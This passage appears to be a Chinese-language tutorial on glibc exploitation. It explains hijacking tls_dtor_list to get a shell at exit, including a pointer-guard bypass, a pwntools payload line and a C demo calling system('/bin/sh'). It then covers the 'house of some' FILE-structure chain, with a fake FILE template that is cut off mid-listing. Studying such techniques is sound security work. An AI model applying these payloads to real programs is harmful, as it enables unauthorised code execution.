<h1 id="劫持tls-dtor-list-利用-call-tls-dtors拿到权限"><a href="#劫持tls-dtor-list-利用-call-tls-dtors拿到权限" class="headerlink" title="劫持tls_dtor_list,利用__call_tls_dtors拿到权限"></a>劫持tls_dtor_list,利用__call_tls_dtors拿到权限</h1><h2 id="概要-21"><a href="#概要-21" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>这个利用也是通过<code>exit</code>触发的，利用流程较为简单</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>largebin attack</li>
<li>能泄露libc和heap</li>
<li><strong>程序能够显式的执行exit函数</strong>或者<strong>main函数能够返回</strong>,</li>
</ol>
<p><strong>利用效果:</strong>程序流执行</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-21"><a href="#原理-21" class="headerlink" title="原理"></a>原理</h2><p>首先来看<code>dtor_list</code>结构体的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，<code>tls_dtor_list</code>就是<code>dtor_list</code>的结构体指针，里面存放着一个<code>dtor_list</code>结构体的地址。<br>再看到<code>__call_tls_dtors</code>函数（对<code>tls_dtor_list</code>进行遍历）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"> </span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由此可知，<code>dtor_list</code>结构体中的<code>func</code>成员，其实是一个函数指针，而其中的<code>obj</code>成员就是其调用时的参数。</p>
<p>若我们可以劫持<code>tls_dtor_list</code>，在其中写入我们伪造的堆地址，使其不为空（绕过<code>while (tls_dtor_list)</code>），就能执行到<code>func (cur-&gt;obj)</code>，而我们又可以控制伪造的堆块中<code>prev_size</code>域为<code>system</code>的相关数据（由于有指针保护，之后会讲），<code>size</code>域为<code>/bin/sh</code>的地址（通过上一个堆块的溢出或合并后重分配），这样就能<code>getshell</code>了，若是想<code>orw</code>，那么可以让<code>func</code>成员为<code>magic_gadget</code>的相关数据，将<code>rdi</code>与<code>rdx</code>转换后，再调用<code>setcontext + 61</code>走<code>SROP</code>即可。</p>
<p>需要注意的是，在调用<code>func</code>函数指针之前，对<code>func</code>执行了<code>PTR_DEMANGLE (func)</code>，这是一个指针保护，我们可以通过<code>gdb</code>直接看到其汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ror    rax,0x11</span><br><span class="line">xor    rax,QWORD PTR fs:0x30</span><br><span class="line">mov    QWORD PTR fs:[rbx],rdx</span><br><span class="line">mov    rdi,QWORD PTR [rbp+0x8]</span><br><span class="line">call   rax</span><br></pre></td></tr></table></figure>
<p>这操作主要是先进行<strong>循环右移</strong><code>0x11</code>位，再与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>进行<strong>异或</strong>，最终得到的数据就是我们的函数指针，并调用。<br>因此，我们在之前所说的将<code>func</code>成员改成的与<code>system</code>相关的数据，就是对指针保护进行一个逆操作：先将<code>system_addr</code>与<code>pointer_guard</code>进行异或，再将结果循环左移<code>0x11</code>位后，填入<code>prev_size</code>域。<br>然而，<code>pointer_guard</code>的值在<code>TLS</code>结构中（在<code>canary</code>保护<code>stack_guard</code>的下一个），我们很难直接得到它的值，但是我们可以通过一些攻击手段，往其中写入我们可控数据，这样就可以控制<code>pointer_guard</code>，进而绕过指针保护了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 两次largebin attack改tls_dtor_list与pointer_guard</span></span><br><span class="line"> </span><br><span class="line">fake_pointer_guard = heap_base + <span class="number">0x17b0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x420</span> + p64(ROL(libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ fake_pointer_guard, <span class="number">0x11</span>, <span class="number">64</span>)) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br></pre></td></tr></table></figure>
<p>demo</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">rotate_left</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value, <span class="type">int</span> left)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (value &lt;&lt; left) | (value &gt;&gt; (<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) * <span class="number">8</span> - left));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fs_base;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> index = <span class="number">0xffffffffffffffa8</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> tls_dtor_list_addr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> random_number;</span><br><span class="line">    <span class="type">void</span> *system_ptr = (<span class="type">void</span> *)&amp;system;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system:%p\n&quot;</span>,system_ptr);</span><br><span class="line">    <span class="comment">// 使用汇编嵌入获取FS寄存器的值</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (fs_base));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Value in FS register: 0x%llx\n&quot;</span>, fs_base);</span><br><span class="line">    tls_dtor_list_addr = fs_base - <span class="number">88</span>;</span><br><span class="line">    random_number = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(fs_base + <span class="number">0x30</span>);</span><br><span class="line">    <span class="type">char</span> *str_bin_sh = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(str_bin_sh,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)ptr = rotate_left((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)system_ptr ^ random_number,<span class="number">0x11</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(ptr + <span class="number">8</span>)  = str_bin_sh;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)tls_dtor_list_addr = ptr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-some"><a href="#house-of-some" class="headerlink" title="house of some"></a>house of some</h1><h2 id="概要-22"><a href="#概要-22" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of some是一条改进House of apple2的新链</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>已知glibc基地址</li>
<li>可控的已知地址（可写入内容构造fake file）</li>
<li>需要一次libc内任意地址写可控地址</li>
<li>程序能正常退出或者通过exit()退出</li>
</ol>
<p><strong>利用效果:</strong>任意地址读写</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-22"><a href="#原理-22" class="headerlink" title="原理"></a>原理</h2><h3 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h3><h3 id="House-of-apple2其中有一条链是如下进行的"><a href="#House-of-apple2其中有一条链是如下进行的" class="headerlink" title="House of apple2其中有一条链是如下进行的"></a>House of apple2其中有一条链是如下进行的</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure>
<p>如果<code>fp-&gt;_wide_data-&gt;_wide_vtable</code>加上了检查，那么只能选择虚表内的函数进行执行，我们能够选什么呢？</p>
<p>那么就需要<code>_IO_new_file_underflow</code>这个函数出场了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以发现在<code>_IO_new_file_underflow</code>函数内会调用<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>宏其对应的常规read函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_file_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">	  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">	  : __read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后是调用syscall(read)读，我们可以看到read的三个参数都是可控的</p>
<ul>
<li><code>fd</code>=&gt;<code>fp-&gt;_fileno</code></li>
<li><code>buf</code>=&gt;<code>fp-&gt;_IO_buf_base</code></li>
<li><code>size</code>=&gt;<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code></li>
</ul>
<p>那么就可以构造一个任意地址写，那么有了任意地址写之后有啥用呢？FSOP！</p>
<p>我们再回到<code>_IO_flush_all</code>函数观察一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的for循环我们可以看到对于<code>_IO_list_all</code>上的单向链表，通过了<code>_chain</code>串起来，并在<code>_IO_flush_all</code>中，会遍历链表上每一个FILE，如果条件成立，就可以调用<code>_IO_OVERFLOW(fp, EOF)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain) </span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么接下来就开始构造一个实现任意地址写的fake file</p>
<p>由于<code>_IO_new_file_underflow</code>内有一个<code>_IO_switch_to_get_mode</code>函数其中有这个分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br></pre></td></tr></table></figure>
<p>如果还是使用<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>来使得触发OVERFLOW就会出现无限递归，所以不可行，我们需要采取另一个分支，即</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <span class="comment">// 不可行</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span>                      <span class="comment">// 使用||之后的分支</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>
<p>那么实现任意地址读的fake file设置如下</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，设置为<code>0</code>即可（与apple2相同）</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap</code>地址，使得调用<code>_IO_wfile_overflow</code>即可（注意此处与apple2不同的是，此处的vtable不能加偏移，否则会打乱<code>_IO_SYSREAD</code>的调用）</li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x18) = 0</code>（与apple2相同）</li>
<li><code>_wide_data-&gt;_IO_write_ptr</code>设置为大于<code>_wide_data-&gt;_IO_write_base</code>，即满足<code>*(_wide_data + 0x20) &gt; *(_wide_data + 0x18)</code>（注意此处不同）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x30) = 0</code>（与apple2相同）</li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为任意一个包含<code>_IO_new_file_underflow</code>，其中原生的vtable就有，设置成<code>_IO_file_jumps-0x48</code>即可</li>
<li><code>_vtable_offset</code>设置为<code>0</code></li>
<li><code>_IO_buf_base</code>与<code>_IO_buf_end</code>设置为你需要写入的地址范围</li>
<li><code>_chain</code>设置为你下一个触发的fake file地址</li>
<li><code>_IO_write_ptr &lt;= _IO_write_base</code>即可</li>
<li><code>_fileno</code>设置为<code>0</code>，表示<code>read(0, buf, size)</code></li>
<li><code>_mode</code>设置为<code>2</code>，满足<code>fp-&gt;_mode &gt; 0</code>即可</li>
</ul>
<p>一个任意地址写的fake file模板如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fake_file_read = flat(&#123;</span><br><span class="line">    0x00: 0, # _flags</span><br><span class="line">    0x20: 0, # _IO_write_base</span><br><span class="line">    0x28: 0, # _IO_write_ptr</span><br><span class="line">    </span><br><span class="line">    0x38: 任意地址写的起始地址, # _IO_buf_base</span><br><span class="line">    0x40: 任意地址写的终止地址, # _IO_buf_end</span><br><span class="line">	</span><br><span class="line">    0x70: 0, # _fileno</span><br><span class="line">    0x82: b&quot;\x00&quot;, # _vtable_offset</span><br><span class="line">    0xc0: 2, # _mode</span><br><span class="line">    0xa0: wide_data的地址, # _wide_data</span><br><span class="line">    0x68: 下一个调用的fake file地址, # 